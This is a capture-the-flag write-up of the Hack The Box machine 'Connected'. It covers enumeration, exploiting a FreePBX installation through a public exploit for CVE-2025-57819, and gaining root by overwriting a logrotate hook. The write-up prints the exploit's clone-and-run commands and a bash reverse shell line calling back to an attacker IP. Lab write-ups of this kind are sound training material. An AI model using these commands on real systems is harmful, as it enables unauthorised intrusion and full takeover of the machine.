# Connected - Hack The Box

> Difficulty: Easy  
> OS: Linux

## Overview

**Connected** is an Easy Linux machine from Hack The Box that focuses on web enumeration, vulnerability research, exploitation of a vulnerable FreePBX installation, and privilege escalation through an insecure hook mechanism.

---

# Enumeration

## Nmap

The first step was performing a full TCP port scan.

```bash
nmap -sC -sV -Pn --min-rate 5000 <TARGET_IP> -oN nmap
```

The scan revealed a web application running on the target.

*(Insert Nmap screenshot here)*

---

## Web Enumeration

After browsing the website, it became clear that the application was running **FreePBX**.

Further enumeration revealed the installed version.


---

# Vulnerability Research

Once the software version was identified, I searched for public vulnerabilities affecting that release.

A public exploit for:

**CVE-2025-57819**

was available on GitHub.

---

# Initial Access

The exploit was cloned and executed.

```bash
git clone https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819.git

python3 watchTowr-vs-FreePBX-CVE-2025-57819.py -H http://connected.htb
```

This resulted in an interactive shell as:

```
asterisk
```


---

# Privilege Escalation

While enumerating the system, I found the following hook:

```
/var/www/html/admin/modules/ucp/hooks/logrotate
```

I replaced its contents with a Bash reverse shell.

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.155/4445 0>&1
```

After the hook executed, I obtained a shell as **root**.


---

# Troubleshooting

Initially, the privilege escalation appeared to fail.

I verified:

- file permissions
- file integrity
- incron configuration
- hook execution

Eventually, I discovered that the reverse shell contained an incorrect attacker IP address.

Once corrected, the exploit worked immediately.

This served as a good reminder that payload validation should always be performed before assuming an exploit is broken.

---

# Skills Learned

- Web Enumeration
- CMS Fingerprinting
- CVE Research
- Public Exploit Usage
- Reverse Shell Generation
- Linux Privilege Escalation
- Bash Payloads
- Troubleshooting

---

# MITRE ATT&CK

| Technique | ID |
|-----------|----|
| Exploit Public-Facing Application | T1190 |
| Command and Scripting Interpreter | T1059 |
| Unix Shell | T1059.004 |
| Exploitation for Privilege Escalation | T1068 |

---

# References

- Hack The Box
- FreePBX
- Public exploit for CVE-2025-57819
